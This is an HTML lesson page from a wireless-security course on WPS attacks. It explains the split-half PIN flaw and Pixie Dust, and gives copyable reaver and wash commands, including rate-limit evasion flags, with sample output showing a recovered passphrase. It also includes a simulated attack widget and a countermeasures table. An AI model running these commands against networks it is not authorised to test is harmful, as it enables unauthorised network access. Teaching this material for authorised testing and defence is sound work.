<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Module 11 — WPS Attacks | WiFi Exploitation Course</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --bg:#0d1117; --bg-card:#161b22; --bg-code:#010409; --border:#30363d;
      --accent:#58a6ff; --accent2:#3fb950; --accent3:#f78166; --warn:#d29922;
      --text:#c9d1d9; --text-dim:#8b949e; --text-head:#e6edf3;
      --radius:8px; --font-mono:'Cascadia Code','Fira Code','Consolas',monospace;
      --font-body:'Segoe UI',system-ui,sans-serif;
    }
    html { scroll-behavior: smooth; }
    body { background:var(--bg); color:var(--text); font-family:var(--font-body); line-height:1.7; font-size:15px; }
    .page-wrapper { display:flex; min-height:100vh; }

    aside.sidebar { width:260px; min-width:260px; background:var(--bg-card); border-right:1px solid var(--border); padding:24px 0; position:sticky; top:0; height:100vh; overflow-y:auto; }
    .sidebar-logo { padding:0 20px 24px; border-bottom:1px solid var(--border); }
    .sidebar-logo .course-title { font-size:11px; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-dim); margin-bottom:6px; }
    .sidebar-logo h2 { font-size:14px; color:var(--accent); font-weight:600; }
    .sidebar-nav { padding:16px 0; }
    .sidebar-section-label { font-size:10px; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-dim); padding:12px 20px 6px; }
    .sidebar-nav a { display:flex; align-items:center; gap:10px; padding:7px 20px; color:var(--text-dim); text-decoration:none; font-size:13px; transition:all 0.15s; border-left:2px solid transparent; }
    .sidebar-nav a:hover { color:var(--text); background:rgba(88,166,255,0.05); }
    .sidebar-nav a.active { color:var(--accent); border-left-color:var(--accent); background:rgba(88,166,255,0.08); }
    .sidebar-nav a .mod-num { font-size:10px; background:var(--border); border-radius:4px; padding:2px 6px; font-family:var(--font-mono); min-width:28px; text-align:center; }
    .sidebar-nav a.active .mod-num { background:rgba(88,166,255,0.2); color:var(--accent); }

    main { flex:1; padding:48px 64px; max-width:960px; }

    .module-header { margin-bottom:40px; }
    .breadcrumb { font-size:12px; color:var(--text-dim); margin-bottom:12px; }
    .breadcrumb a { color:var(--accent); text-decoration:none; }
    .module-badge { display:inline-flex; align-items:center; gap:8px; background:rgba(88,166,255,0.12); border:1px solid rgba(88,166,255,0.3); border-radius:20px; padding:4px 14px; font-size:12px; color:var(--accent); margin-bottom:16px; }
    .module-header h1 { font-size:2.2rem; color:var(--text-head); line-height:1.2; margin-bottom:12px; }
    .module-header .subtitle { font-size:16px; color:var(--text-dim); max-width:640px; }
    .meta-row { display:flex; gap:24px; margin-top:20px; flex-wrap:wrap; }
    .meta-pill { display:flex; align-items:center; gap:6px; font-size:12px; color:var(--text-dim); }
    .meta-pill .dot { width:8px; height:8px; border-radius:50%; }

    .warning-box { background:rgba(210,153,34,0.08); border:1px solid rgba(210,153,34,0.4); border-radius:var(--radius); padding:16px 20px; margin-bottom:36px; display:flex; gap:12px; }
    .warning-box p { font-size:13px; color:var(--warn); line-height:1.6; }
    .warning-box strong { color:#e3b341; }

    section { margin-bottom:52px; }
    section h2 { font-size:1.35rem; color:var(--text-head); margin-bottom:16px; padding-bottom:8px; border-bottom:1px solid var(--border); display:flex; align-items:center; gap:10px; }
    section h2 .section-num { font-size:12px; color:var(--accent); font-family:var(--font-mono); background:rgba(88,166,255,0.1); border-radius:4px; padding:2px 8px; }
    section h3 { font-size:1.05rem; color:var(--text-head); margin:24px 0 10px; }
    p { margin-bottom:12px; }

    .terminal { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; margin:16px 0; font-family:var(--font-mono); font-size:13px; }
    .terminal-bar { background:#161b22; border-bottom:1px solid var(--border); padding:8px 14px; display:flex; align-items:center; gap:10px; }
    .terminal-dots { display:flex; gap:6px; }
    .terminal-dots span { width:10px; height:10px; border-radius:50%; }
    .d-red{background:#f78166} .d-yellow{background:#e3b341} .d-green{background:#3fb950}
    .terminal-title { font-size:11px; color:var(--text-dim); }
    .terminal-copy { margin-left:auto; background:none; border:1px solid var(--border); border-radius:4px; padding:3px 10px; color:var(--text-dim); font-size:11px; cursor:pointer; font-family:var(--font-body); transition:all 0.15s; }
    .terminal-copy:hover { border-color:var(--accent); color:var(--accent); }
    .terminal-copy.copied { border-color:var(--accent2); color:var(--accent2); }
    .terminal-body { padding:16px 18px; overflow-x:auto; line-height:1.9; color:#c9d1d9; white-space:pre-wrap; }
    .prompt{color:var(--accent2);user-select:none} .cmd{color:#e6edf3} .flag{color:#ffa657}
    .str{color:#a5d6ff} .cmt{color:#6e7681;font-style:italic} .out{color:var(--text-dim)}
    .out-ok{color:var(--accent2)} .out-warn{color:var(--warn)} .out-err{color:var(--accent3)}

    .table-wrap { overflow-x:auto; margin:20px 0; border-radius:var(--radius); border:1px solid var(--border); }
    table { width:100%; border-collapse:collapse; font-size:13px; }
    thead tr { background:rgba(88,166,255,0.06); }
    th { padding:10px 14px; text-align:left; color:var(--accent); font-weight:600; font-size:11px; text-transform:uppercase; letter-spacing:0.8px; border-bottom:1px solid var(--border); }
    td { padding:10px 14px; border-bottom:1px solid rgba(48,54,61,0.6); vertical-align:top; }
    tr:last-child td { border-bottom:none; }
    tr:hover td { background:rgba(88,166,255,0.03); }
    code { font-family:var(--font-mono); font-size:12px; background:rgba(110,118,129,0.15); padding:2px 6px; border-radius:4px; color:#79c0ff; }

    .callout { border-radius:var(--radius); padding:14px 18px; margin:16px 0; display:flex; gap:12px; font-size:13px; line-height:1.6; }
    .callout.info  { background:rgba(88,166,255,0.07); border-left:3px solid var(--accent); }
    .callout.attack{ background:rgba(247,129,102,0.07); border-left:3px solid var(--accent3); }
    .callout.tip   { background:rgba(63,185,80,0.07);  border-left:3px solid var(--accent2); }
    .callout.warn  { background:rgba(210,153,34,0.07); border-left:3px solid var(--warn); }
    .callout .ci { flex-shrink:0; font-size:16px; }
    .callout strong { color:var(--text-head); }

    /* PIN split diagram */
    .pin-diagram { display:flex; gap:0; margin:20px 0; align-items:stretch; font-family:var(--font-mono); }
    .pin-digit { width:52px; height:64px; display:flex; flex-direction:column; align-items:center; justify-content:center; border:1px solid var(--border); font-size:20px; font-weight:700; color:var(--text-head); background:var(--bg-card); gap:4px; }
    .pin-digit:first-child { border-radius:var(--radius) 0 0 var(--radius); }
    .pin-digit:last-child  { border-radius:0 var(--radius) var(--radius) 0; }
    .pin-digit .pos { font-size:9px; color:var(--text-dim); font-weight:400; }
    .pin-digit.half1 { border-color:var(--accent); color:var(--accent); background:rgba(88,166,255,0.08); }
    .pin-digit.half2 { border-color:var(--accent2); color:var(--accent2); background:rgba(63,185,80,0.08); }
    .pin-digit.checksum { border-color:var(--warn); color:var(--warn); background:rgba(210,153,34,0.08); }
    .pin-legend { display:flex; gap:20px; margin-top:8px; font-size:12px; }
    .pin-legend span { display:flex; align-items:center; gap:6px; }
    .pin-legend .swatch { width:12px; height:12px; border-radius:3px; }

    /* WPS message flow */
    .msg-flow { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:20px; margin:16px 0; font-family:var(--font-mono); font-size:12px; }
    .msg-row { display:flex; align-items:center; gap:8px; padding:5px 0; border-bottom:1px solid rgba(48,54,61,0.4); }
    .msg-row:last-child { border-bottom:none; }
    .msg-from { color:var(--accent); width:90px; flex-shrink:0; }
    .msg-arrow { color:var(--text-dim); }
    .msg-name { color:var(--text-head); font-weight:600; width:45px; }
    .msg-detail { color:var(--text-dim); font-size:11px; flex:1; }
    .msg-vuln { color:var(--accent3); font-size:11px; }

    /* Search space comparison */
    .space-compare { display:grid; grid-template-columns:1fr 1fr 1fr; gap:16px; margin:20px 0; }
    @media(max-width:600px) { .space-compare { grid-template-columns:1fr; } }
    .space-card { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:18px; text-align:center; }
    .space-card .sc-label { font-size:11px; color:var(--text-dim); text-transform:uppercase; letter-spacing:0.8px; margin-bottom:8px; }
    .space-card .sc-num { font-size:1.8rem; font-weight:700; font-family:var(--font-mono); margin-bottom:4px; }
    .space-card .sc-sub { font-size:11px; color:var(--text-dim); }
    .space-card.bad .sc-num { color:var(--accent3); }
    .space-card.mid .sc-num { color:var(--warn); }
    .space-card.good .sc-num { color:var(--accent2); }

    /* WPS Attack Simulator */
    .wps-sim { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:24px; margin:20px 0; }
    .wps-sim h3 { font-size:14px; color:var(--text-head); margin-bottom:16px; }
    .sim-row { display:flex; gap:12px; margin-bottom:16px; flex-wrap:wrap; align-items:flex-end; }
    .sim-field { display:flex; flex-direction:column; gap:6px; }
    .sim-field label { font-size:11px; color:var(--text-dim); text-transform:uppercase; letter-spacing:0.8px; }
    .sim-field input, .sim-field select { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:7px 12px; color:var(--text); font-size:13px; font-family:var(--font-body); outline:none; min-width:160px; }
    .sim-field input:focus, .sim-field select:focus { border-color:var(--accent); }
    .sim-btn { padding:8px 20px; background:var(--accent); border:none; border-radius:6px; color:#0d1117; font-weight:700; font-size:13px; cursor:pointer; font-family:var(--font-body); transition:all 0.2s; height:36px; align-self:flex-end; }
    .sim-btn:hover { background:#79c0ff; }
    .sim-btn:disabled { background:var(--border); color:var(--text-dim); cursor:default; }
    .sim-output { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); padding:16px; font-family:var(--font-mono); font-size:12px; line-height:1.9; min-height:200px; max-height:360px; overflow-y:auto; white-space:pre-wrap; }
    .sim-progress { margin-top:14px; }
    .sim-progress label { font-size:11px; color:var(--text-dim); display:flex; justify-content:space-between; margin-bottom:6px; }
    .progress-bar { background:var(--bg); border:1px solid var(--border); border-radius:4px; height:10px; overflow:hidden; }
    .progress-fill { height:100%; background:var(--accent); border-radius:4px; transition:width 0.3s ease; width:0%; }
    .progress-fill.pixie { background:var(--accent3); }
    .result-banner { margin-top:14px; background:rgba(63,185,80,0.1); border:1px solid var(--accent2); border-radius:var(--radius); padding:14px 18px; display:none; }
    .result-banner.show { display:block; }
    .result-banner .rb-pin  { font-family:var(--font-mono); color:var(--accent); font-size:14px; }
    .result-banner .rb-psk  { font-family:var(--font-mono); color:var(--accent2); font-size:14px; font-weight:700; }

    .nav-footer { display:flex; justify-content:space-between; align-items:center; padding:32px 0 0; border-top:1px solid var(--border); margin-top:48px; }
    .nav-btn { display:inline-flex; align-items:center; gap:8px; padding:10px 20px; border-radius:var(--radius); text-decoration:none; font-size:13px; font-weight:600; transition:all 0.2s; }
    .nav-btn.next { background:var(--accent); color:#0d1117; }
    .nav-btn.next:hover { background:#79c0ff; }
    .nav-btn.prev { border:1px solid var(--border); color:var(--text-dim); }
    .nav-btn.prev:hover { border-color:var(--accent); color:var(--accent); }

    ::-webkit-scrollbar { width:6px; height:6px; }
    ::-webkit-scrollbar-track { background:var(--bg); }
    ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
    ::-webkit-scrollbar-thumb:hover { background:var(--text-dim); }

    @media (max-width:900px) { aside.sidebar { display:none; } main { padding:24px 20px; } }
  </style>
</head>
<body>
<div class="page-wrapper">

  <aside class="sidebar">
    <div class="sidebar-logo">
      <div class="course-title">WiFi Exploitation Course</div>
      <h2>Wireless Security</h2>
    </div>
    <nav class="sidebar-nav">
      <div class="sidebar-section-label">Tier 1 — Foundations</div>
      <a href="../module-00-foundations/"><span class="mod-num">00</span> 802.11 Foundations</a>
      <a href="../module-01-linux-wireless-setup/"><span class="mod-num">01</span> Linux Wireless Setup</a>
      <a href="../module-02-monitor-mode/"><span class="mod-num">02</span> Monitor Mode</a>
      <div class="sidebar-section-label">Tier 2 — Recon</div>
      <a href="../module-03-reconnaissance/"><span class="mod-num">03</span> Reconnaissance</a>
      <a href="../module-04-packet-analysis/"><span class="mod-num">04</span> Packet Analysis</a>
      <div class="sidebar-section-label">Tier 3 — Legacy</div>
      <a href="../module-05-wep-cracking/"><span class="mod-num">05</span> WEP Cracking</a>
      <div class="sidebar-section-label">Tier 4 — WPA2-Personal</div>
      <a href="../module-06-wpa2-handshake/"><span class="mod-num">06</span> WPA2 Handshake</a>
      <a href="../module-07-wpa2-cracking/"><span class="mod-num">07</span> WPA2 Cracking</a>
      <div class="sidebar-section-label">Tier 5 — Active Attacks</div>
      <a href="../module-08-deauth-dos/"><span class="mod-num">08</span> Deauth &amp; DoS</a>
      <div class="sidebar-section-label">Tier 6 — Rogue AP</div>
      <a href="../module-09-evil-twin/"><span class="mod-num">09</span> Evil Twin</a>
      <a href="../module-10-captive-portal/"><span class="mod-num">10</span> Captive Portal</a>
      <div class="sidebar-section-label">Tier 7 — WPS</div>
      <a href="#" class="active"><span class="mod-num">11</span> WPS Attacks</a>
      <div class="sidebar-section-label">Tier 8 — Modern</div>
      <a href="../module-12-pmkid-attack/"><span class="mod-num">12</span> PMKID Attack</a>
      <a href="../module-13-enterprise-wpa/"><span class="mod-num">13</span> WPA-Enterprise</a>
      <div class="sidebar-section-label">Tier 9 — Chaining</div>
      <a href="../module-14-attack-chaining/"><span class="mod-num">14</span> Attack Chaining</a>
    </nav>
  </aside>

  <main>
    <div class="module-header">
      <div class="breadcrumb"><a href="../">WiFi Exploitation Course</a> / Module 11</div>
      <div class="module-badge">&#9679; Tier 7 &mdash; WPS Vulnerabilities</div>
      <h1>WPS Attacks — PIN Bruteforce &amp; Pixie Dust</h1>
      <p class="subtitle">Exploit the WPS PIN design flaw to recover WPA2 passphrases in under 11,000 guesses — or in under 10 seconds with the Pixie Dust offline attack against vulnerable firmware.</p>
      <div class="meta-row">
        <div class="meta-pill"><span class="dot" style="background:#f78166"></span> Intermediate</div>
        <div class="meta-pill"><span class="dot" style="background:#58a6ff"></span> ~45 min</div>
        <div class="meta-pill"><span class="dot" style="background:#3fb950"></span> No handshake needed</div>
      </div>
    </div>

    <div class="warning-box">
      <p><strong>Legal Notice:</strong> WPS attacks must only be performed on equipment you own or have explicit written authorization to test. Unauthorized access attempts are illegal under the CFAA, UK Computer Misuse Act, and equivalent laws worldwide.</p>
    </div>

    <!-- Section 1: PIN Flaw -->
    <section id="flaw">
      <h2><span class="section-num">01</span> The WPS PIN Design Flaw</h2>
      <p>The 8-digit WPS PIN is validated by the AP in <strong>two independent halves</strong>, reducing the effective search space from 100 million to just 11,000 guesses.</p>

      <div class="pin-diagram">
        <div class="pin-digit half1"><span class="pos">D1</span>1</div>
        <div class="pin-digit half1"><span class="pos">D2</span>2</div>
        <div class="pin-digit half1"><span class="pos">D3</span>3</div>
        <div class="pin-digit half1"><span class="pos">D4</span>4</div>
        <div class="pin-digit half2"><span class="pos">D5</span>5</div>
        <div class="pin-digit half2"><span class="pos">D6</span>6</div>
        <div class="pin-digit half2"><span class="pos">D7</span>7</div>
        <div class="pin-digit checksum"><span class="pos">D8</span>&#x2211;</div>
      </div>
      <div class="pin-legend">
        <span><span class="swatch" style="background:rgba(88,166,255,0.5)"></span> Half 1 (D1–D4): 10,000 values</span>
        <span><span class="swatch" style="background:rgba(63,185,80,0.5)"></span> Half 2 (D5–D7): 1,000 values</span>
        <span><span class="swatch" style="background:rgba(210,153,34,0.5)"></span> D8: checksum (derived)</span>
      </div>

      <div class="space-compare" style="margin-top:20px;">
        <div class="space-card bad">
          <div class="sc-label">Full 8-digit brute force</div>
          <div class="sc-num">100M</div>
          <div class="sc-sub">~3 years</div>
        </div>
        <div class="space-card mid">
          <div class="sc-label">Split-half WPS PIN</div>
          <div class="sc-num">11,000</div>
          <div class="sc-sub">4–10 hours</div>
        </div>
        <div class="space-card good">
          <div class="sc-label">Pixie Dust (offline)</div>
          <div class="sc-num">1</div>
          <div class="sc-sub">&lt; 10 seconds</div>
        </div>
      </div>

      <div class="callout attack">
        <span class="ci">&#9889;</span>
        <div><strong>The fatal flaw:</strong> The AP sends a <strong>NACK at M4</strong> if half 1 is wrong — before half 2 is even attempted. This leaks which half is correct, transforming one 8-digit guess into two independent 4-digit and 3-digit guesses.</div>
      </div>
    </section>

    <!-- Section 2: WPS Message Flow -->
    <section id="flow">
      <h2><span class="section-num">02</span> WPS M1–M8 Exchange</h2>
      <p>The WPS registration protocol exchanges 8 messages (M1–M8). The split-half validation happens at M4 and M6; the WPA2 passphrase is delivered in M8.</p>

      <div class="msg-flow">
        <div class="msg-row"><span class="msg-from">Enrollee</span><span class="msg-arrow">──M1──►</span><span class="msg-name">M1</span><span class="msg-detail">E-Nonce, PKE (enrollee public key)</span><span class="msg-vuln">← Pixie Dust captures E-Nonce here</span></div>
        <div class="msg-row"><span class="msg-from">Registrar</span><span class="msg-arrow">◄─M2───</span><span class="msg-name">M2</span><span class="msg-detail">R-Nonce, PKR (registrar public key)</span><span class="msg-vuln">← Pixie Dust captures R-Nonce here</span></div>
        <div class="msg-row"><span class="msg-from">Enrollee</span><span class="msg-arrow">──M3──►</span><span class="msg-name">M3</span><span class="msg-detail">E-Hash1 = HMAC(PIN half 1 + nonces)</span></div>
        <div class="msg-row"><span class="msg-from">Registrar</span><span class="msg-arrow">◄─M4───</span><span class="msg-name">M4</span><span class="msg-detail">R-Hash1 — validates half 1</span><span class="msg-vuln" style="color:var(--accent2)">← NACK here = half 1 wrong</span></div>
        <div class="msg-row"><span class="msg-from">Enrollee</span><span class="msg-arrow">──M5──►</span><span class="msg-name">M5</span><span class="msg-detail">E-Hash2 = HMAC(PIN half 2 + nonces)</span></div>
        <div class="msg-row"><span class="msg-from">Registrar</span><span class="msg-arrow">◄─M6───</span><span class="msg-name">M6</span><span class="msg-detail">R-Hash2 — validates half 2</span><span class="msg-vuln" style="color:var(--accent2)">← NACK here = half 2 wrong</span></div>
        <div class="msg-row"><span class="msg-from">Enrollee</span><span class="msg-arrow">──M7──►</span><span class="msg-name">M7</span><span class="msg-detail">Confirm</span></div>
        <div class="msg-row"><span class="msg-from">Registrar</span><span class="msg-arrow">◄─M8───</span><span class="msg-name">M8</span><span class="msg-detail">Encrypted WPA2 PSK delivered</span><span class="msg-vuln" style="color:var(--accent3)">← AP hands you the real password!</span></div>
      </div>
    </section>

    <!-- Section 3: wash scan -->
    <section id="wash">
      <h2><span class="section-num">03</span> Scanning with wash</h2>
      <p>Before attacking, identify WPS-enabled APs using <code>wash</code> — the built-in scanner included with reaver.</p>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">wash — scan for WPS-enabled APs</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-wash')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-wash"><span class="cmt"># Put adapter in monitor mode first</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo airmon-ng start wlan0</span>

<span class="cmt"># Scan for WPS-enabled APs</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo wash <span class="flag">-i</span> wlan0mon</span>

<span class="out-warn">BSSID              Ch  dBm  WPS  Lck  Vendor    ESSID</span>
<span class="out-ok">AA:BB:CC:DD:EE:FF   6  -45  2.0  No   Netgear   HomeNetwork</span>
<span class="out-warn">11:22:33:44:55:66  11  -67  1.0  Yes  TP-Link   OfficeWifi   &lt;-- locked</span>
<span class="out-ok">22:33:44:55:66:77   1  -72  2.0  No   D-Link    CafeGuest</span>

<span class="cmt"># Lock to channel 6 for faster scanning</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo wash <span class="flag">-i</span> wlan0mon <span class="flag">-c</span> <span class="str">6</span></span></div>
      </div>
    </section>

    <!-- Section 4: reaver -->
    <section id="reaver">
      <h2><span class="section-num">04</span> PIN Bruteforce with reaver</h2>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">reaver PIN bruteforce</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-reaver')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-reaver"><span class="cmt"># Basic attack</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo reaver <span class="flag">-i</span> wlan0mon <span class="flag">-b</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-vv</span></span>

<span class="cmt"># Full options — rate-limit evasion</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo reaver <span class="flag">-i</span> wlan0mon <span class="flag">-b</span> <span class="str">AA:BB:CC:DD:EE:FF</span> \
  <span class="flag">-c</span> <span class="str">6</span>        \
  <span class="flag">-d</span> <span class="str">1</span>        \
  <span class="flag">-t</span> <span class="str">5</span>        \
  <span class="flag">-r</span> <span class="str">3:15</span>     \
  <span class="flag">-S</span>           \
  <span class="flag">-vv</span></span>

<span class="out-ok">[*] Waiting for beacon from AA:BB:CC:DD:EE:FF</span>
<span class="out-ok">[+] Associated with AA:BB:CC:DD:EE:FF (ESSID: HomeNetwork)</span>
<span class="out">[+] Trying pin "12340000"</span>
<span class="out">[+] Trying pin "12340001"</span>
<span class="out">...</span>
<span class="out-ok">[+] WPS PIN: '12345678'</span>
<span class="out-ok">[+] WPA PSK: 'MySecretPassword123'</span></div>
      </div>

      <div class="callout info">
        <span class="ci">&#128161;</span>
        <div><strong>Key flags:</strong> <code>-d 1</code> adds a 1-second delay between attempts to avoid lock-out. <code>-r 3:15</code> sleeps 15 seconds after every 3 attempts. <code>-S</code> uses small DH keys, which some APs require. <code>-N</code> disables NACKs if the AP behaves oddly.</div>
      </div>
    </section>

    <!-- Section 5: Pixie Dust -->
    <section id="pixiedust">
      <h2><span class="section-num">05</span> Pixie Dust Attack</h2>
      <p>Pixie Dust is an <em>offline</em> attack that works in a single WPS exchange on routers with a weak pseudo-random number generator. No repeated guesses to the AP are needed.</p>

      <div class="callout attack">
        <span class="ci">&#128165;</span>
        <div><strong>How it works:</strong> The enrollee's secret nonces (E-S1, E-S2) are supposed to be random. On vulnerable firmware (Ralink, Broadcom, Realtek), they are either zero, reused, or seeded from a predictable source. <code>pixiewps</code> recovers the PIN offline from a single M1–M3 capture.</div>
      </div>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">Pixie Dust with reaver -K 1</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-pixie')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-pixie"><span class="cmt"># -K 1 enables Pixie Dust — captures exchange and calls pixiewps</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo reaver <span class="flag">-i</span> wlan0mon <span class="flag">-b</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-vv</span> <span class="flag">-K</span> <span class="str">1</span></span>

<span class="out-ok">[*] Waiting for beacon from AA:BB:CC:DD:EE:FF</span>
<span class="out-ok">[+] Associated with AA:BB:CC:DD:EE:FF</span>
<span class="out">[+] Received M1 — capturing E-Nonce...</span>
<span class="out">[+] Received M2 — capturing R-Nonce...</span>
<span class="out">[Pixie-Dust] Running pixiewps offline analysis...</span>
<span class="out-ok">[Pixie-Dust] WPS PIN found: 12345678</span>
<span class="out-ok">[+] WPA PSK: 'MySecretPassword123'</span>
<span class="out-warn">[*] Time taken: 0h 0m 3s</span></div>
      </div>

      <div class="table-wrap">
        <table>
          <thead>
            <tr><th>Vendor / Chipset</th><th>Pixie Dust Vulnerability</th></tr>
          </thead>
          <tbody>
            <tr><td>Ralink / MediaTek</td><td>E-S1 = E-S2 = 0x00…00 (all zeros)</td></tr>
            <tr><td>Broadcom</td><td>E-S1/E-S2 derived from system uptime</td></tr>
            <tr><td>Realtek</td><td>Predictable PRNG seed</td></tr>
            <tr><td>Various cheap OEM</td><td>Nonces reused across sessions</td></tr>
          </tbody>
        </table>
      </div>
    </section>

    <!-- Section 6: Simulator -->
    <section id="simulator">
      <h2><span class="section-num">06</span> WPS Attack Simulator</h2>
      <p>Simulate either a PIN bruteforce or Pixie Dust attack and watch the exchange unfold.</p>

      <div class="wps-sim">
        <h3>&#128273; WPS Attack Simulator</h3>
        <div class="sim-row">
          <div class="sim-field">
            <label>Target BSSID</label>
            <input type="text" id="simBSSID" value="AA:BB:CC:DD:EE:FF" />
          </div>
          <div class="sim-field">
            <label>Attack Mode</label>
            <select id="simMode">
              <option value="pin">PIN Bruteforce (reaver)</option>
              <option value="pixie">Pixie Dust (offline)</option>
            </select>
          </div>
          <div class="sim-field">
            <label>WPS Locked?</label>
            <select id="simLocked">
              <option value="no">No</option>
              <option value="yes">Yes</option>
            </select>
          </div>
          <button class="sim-btn" id="simStartBtn" onclick="startWpsSim()">&#9654; Start Attack</button>
        </div>
        <div class="sim-output" id="wpsOutput"><span style="color:var(--text-dim);">Configure the attack above and click "Start Attack"...</span></div>
        <div class="sim-progress" id="simProgressDiv" style="display:none;">
          <label>
            <span id="progressLabel">Progress</span>
            <span id="progressPct">0%</span>
          </label>
          <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
        </div>
        <div class="result-banner" id="resultBanner">
          <div style="font-size:13px;color:var(--accent2);margin-bottom:8px;">&#10003; Attack Successful</div>
          <div>WPS PIN: <span class="rb-pin" id="resultPin"></span></div>
          <div>WPA PSK: <span class="rb-psk" id="resultPsk"></span></div>
        </div>
      </div>
    </section>

    <!-- Section 7: Countermeasures -->
    <section id="countermeasures">
      <h2><span class="section-num">07</span> Detection &amp; Countermeasures</h2>

      <div class="table-wrap">
        <table>
          <thead>
            <tr><th>Countermeasure</th><th>Effectiveness</th><th>How to Apply</th></tr>
          </thead>
          <tbody>
            <tr><td><strong>Disable WPS</strong></td><td>Complete protection</td><td>Router admin → Wireless → WPS → Off</td></tr>
            <tr><td>WPS lock-out (3–5 attempts)</td><td>High (slows PIN brute force)</td><td>Enable in router firmware</td></tr>
            <tr><td>Firmware update</td><td>Fixes Pixie Dust on patched models</td><td>Check vendor security advisories</td></tr>
            <tr><td>WPS 2.0 only</td><td>Blocks WPS 1.0 enrollees</td><td>Router firmware setting</td></tr>
          </tbody>
        </table>
      </div>

      <div class="callout tip">
        <span class="ci">&#128274;</span>
        <div><strong>Verify WPS is truly disabled:</strong> Some routers report WPS as disabled but still respond to WPS probes. After disabling, run <code>sudo wash -i wlan0mon</code> and confirm the target no longer appears in the output.</div>
      </div>
    </section>

    <div class="nav-footer">
      <a href="../module-10-captive-portal/" class="nav-btn prev">&#8592; Module 10: Captive Portal</a>
      <a href="../module-12-pmkid-attack/" class="nav-btn next">Module 12: PMKID Attack &#8594;</a>
    </div>
  </main>
</div>

<script>
  function copyTerm(btn, id) {
    const el = document.getElementById(id);
    navigator.clipboard.writeText((el.innerText || el.textContent).trim()).then(() => {
      btn.textContent = 'Copied!'; btn.classList.add('copied');
      setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
    });
  }

  let simRunning = false;
  let simTimer = null;

  const fakePSKs = ['Str0ngP@ss!', 'Summer2024!', 'CoffeeShop1', 'Password123', 'MyWifi#2024'];

  function randomPin() {
    return String(Math.floor(Math.random() * 100000000)).padStart(8, '0');
  }

  function append(text, delay) {
    setTimeout(() => {
      const out = document.getElementById('wpsOutput');
      out.innerHTML += text + '\n';
      out.scrollTop = out.scrollHeight;
    }, delay);
  }

  function startWpsSim() {
    if (simRunning) return;
    simRunning = true;

    const bssid  = document.getElementById('simBSSID').value || 'AA:BB:CC:DD:EE:FF';
    const mode   = document.getElementById('simMode').value;
    const locked = document.getElementById('simLocked').value;
    const btn    = document.getElementById('simStartBtn');
    const progDiv = document.getElementById('simProgressDiv');
    const fill   = document.getElementById('progressFill');
    const pct    = document.getElementById('progressPct');
    const label  = document.getElementById('progressLabel');
    const banner = document.getElementById('resultBanner');

    btn.disabled = true;
    document.getElementById('wpsOutput').innerHTML = '';
    banner.classList.remove('show');
    fill.style.width = '0%';
    fill.className = 'progress-fill' + (mode === 'pixie' ? ' pixie' : '');
    progDiv.style.display = 'block';
    pct.textContent = '0%';

    const pin = randomPin();
    const psk = fakePSKs[Math.floor(Math.random() * fakePSKs.length)];

    if (locked === 'yes') {
      append(`<span style="color:var(--accent2)">[*]</span> Waiting for beacon from ${bssid}...`, 0);
      append(`<span style="color:var(--accent2)">[+]</span> Associated with ${bssid}`, 400);
      append(`<span style="color:var(--accent3)">[!]</span> WPS LOCKED — AP rejecting all PIN attempts`, 900);
      append(`<span style="color:var(--warn)">[*]</span> Waiting for lock timeout (60s)...`, 1200);
      append(`<span style="color:var(--text-dim)">Tip: Use Pixie Dust — only needs 1 exchange, never triggers lock-out</span>`, 1600);
      fill.style.width = '100%'; pct.textContent = '100%';
      setTimeout(() => { simRunning = false; btn.disabled = false; }, 2000);
      return;
    }

    if (mode === 'pixie') {
      label.textContent = 'Pixie Dust offline analysis';
      append(`<span style="color:var(--accent2)">[*]</span> Waiting for beacon from ${bssid}`, 0);
      append(`<span style="color:var(--accent2)">[+]</span> Associated — starting WPS exchange`, 400);
      append(`<span style="color:var(--accent)">[+]</span> Received M1 — capturing E-Nonce`, 900);
      append(`<span style="color:var(--accent)">[+]</span> Sent M2 — capturing R-Nonce, PKE, PKR`, 1300);
      append(`<span style="color:var(--accent)">[+]</span> Received M3 — E-Hash1, E-Hash2 captured`, 1700);
      append(`<span style="color:var(--warn)">[Pixie-Dust]</span> Running pixiewps offline...`, 2100);

      let p = 0;
      const iv = setInterval(() => {
        p += 20; fill.style.width = p + '%'; pct.textContent = p + '%';
        if (p >= 100) clearInterval(iv);
      }, 120);

      append(`<span style="color:var(--accent3)">[Pixie-Dust]</span> Detected weak PRNG: E-S1 = 0x0000000000000000`, 2400);
